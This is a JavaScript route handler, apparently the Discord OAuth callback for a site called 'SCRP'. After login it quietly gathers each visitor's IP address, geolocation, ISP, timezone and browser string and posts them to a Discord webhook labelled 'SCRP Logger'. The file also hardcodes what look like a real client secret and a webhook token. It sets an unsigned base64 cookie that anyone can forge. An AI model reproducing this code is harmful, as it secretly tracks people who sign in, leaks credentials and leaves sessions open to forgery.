export async function GET(req) {
  const { searchParams } = new URL(req.url)
  const code = searchParams.get("code")

  if (!code) {
    return new Response("Missing code from Discord", { status: 400 })
  }

  try {
    // Exchange code for token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: "1388702262829781093",
        client_secret: "oKdkh7KGFD2cckPy5XZR_--TzCw34Q_5",
        grant_type: "authorization_code",
        code,
        redirect_uri: "https://scrpsites.vercel.app/api/callback",
        scope: "identify",
      }),
    })

    const tokenData = await tokenRes.json()

    if (!tokenData.access_token) {
      return new Response("Failed to get Discord token", { status: 400 })
    }

    // Get user info
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: {
        Authorization: `Bearer ${tokenData.access_token}`,
      },
    })

    const user = await userRes.json()

    // Build avatar URL
    const avatarURL = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
      : `https://cdn.discordapp.com/embed/avatars/${Number.parseInt(user.discriminator) % 5}.png`

    // Get real IP from headers
    const forwarded = req.headers.get("x-forwarded-for")
    const realIp = forwarded ? forwarded.split(",")[0] : "Unknown"

    // Get geolocation from ipwho.is
    const geoRes = await fetch(`https://ipwho.is/${realIp}`)
    const geoData = await geoRes.json()

    const city = geoData.city || "Unknown"
    const region = geoData.region || "Unknown"
    const country = geoData.country || "Unknown"
    const isp = geoData.connection?.isp || "Unknown"
    const timezone = geoData.timezone?.id || "Unknown"
    const countryCode = geoData.country_code?.toLowerCase() || "xx"

    // Get device/browser info
    const userAgent = req.headers.get("user-agent") || "Unknown"

    // Formatted local date/time
    const formattedTime = new Date().toLocaleString("en-US", {
      timeZone: "Asia/Manila",
      dateStyle: "long",
      timeStyle: "short",
    })

    // Send embed to webhook
    await fetch(
      "https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "✅ New Discord Login",
              color: 16777215,
              thumbnail: {
                url: avatarURL,
              },
              fields: [
                { name: "👤 Username", value: `${user.username}#${user.discriminator}`, inline: true },
                { name: "🆔 User ID", value: `${user.id}`, inline: true },
                { name: "🌐 IP Address", value: realIp, inline: false },
                { name: "📍 Location", value: `${city}, ${region}, ${country} :flag_${countryCode}:`, inline: false },
                { name: "🛰️ ISP", value: isp, inline: true },
                { name: "🕒 Timezone", value: timezone, inline: true },
                { name: "📅 Logged At", value: formattedTime, inline: false },
                { name: "📱 Device Info", value: userAgent, inline: false },
              ],
              footer: {
                text: "SCRP Logger",
              },
              timestamp: new Date().toISOString(),
            },
          ],
        }),
      },
    )

    // Create authentication token (simple approach - in production use JWT)
    const authToken = Buffer.from(
      JSON.stringify({
        userId: user.id,
        username: user.username,
        discriminator: user.discriminator,
        avatar: user.avatar,
        loginTime: Date.now(),
      }),
    ).toString("base64")

    // Create response with redirect
    const response = new Response(null, {
      status: 302,
      headers: {
        Location: "https://scrpsites.vercel.app/?success=true",
      },
    })

    // Set authentication cookie (expires in 30 days)
    response.headers.set(
      "Set-Cookie",
      `scrp-auth=${authToken}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=${30 * 24 * 60 * 60}`,
    )

    return response
  } catch (error) {
    console.error("OAuth callback error:", error)
    return new Response("Authentication failed", { status: 500 })
  }
}
